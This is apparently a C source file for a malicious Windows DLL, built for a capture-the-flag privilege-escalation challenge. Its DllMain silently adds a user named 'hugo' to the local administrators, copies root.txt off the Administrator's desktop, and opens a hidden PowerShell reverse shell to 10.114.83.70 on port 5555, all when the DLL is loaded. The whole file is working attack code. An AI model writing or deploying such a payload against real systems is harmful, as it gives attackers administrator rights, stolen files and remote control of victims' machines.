#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Add hugo to administrators
            WinExec("cmd.exe /c net localgroup administrators hugo /add", SW_HIDE);
            
            // Copy flag to hugo's desktop
            WinExec("cmd.exe /c copy \"C:\\Users\\Administrator\\Desktop\\root.txt\" \"C:\\Users\\hugo\\Desktop\\root.txt\"", SW_HIDE);
            
            // Reverse shell - change IP and port
            WinExec("powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('10.114.83.70',5555);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r+'PS> '),0,([text.encoding]::ASCII).GetBytes($r+'PS> ').Length);$s.Flush()}\"", SW_HIDE);
            break;
    }
    return TRUE;
}
